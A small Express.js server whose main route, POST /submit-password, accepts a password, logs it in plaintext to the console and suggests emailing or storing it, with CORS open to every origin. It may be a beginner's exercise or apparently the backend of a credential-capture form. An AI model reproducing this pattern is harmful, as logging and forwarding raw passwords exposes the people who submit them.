const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 5001;

// Middleware
// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


// Root route for testing
app.get('/', (req, res) => {
    res.send('Server is running idiott');
});

// Endpoint to handle form submissions
app.post('/submit-password', (req, res) => {
    const password = req.body.password;
    console.log('Received password:', password);
    // Process the password (e.g., store in a database, send via email)
    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ message: 'Password received successfully' });
});

// CORS middleware configuration
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); // Replace with specific origin in production
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// Start server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
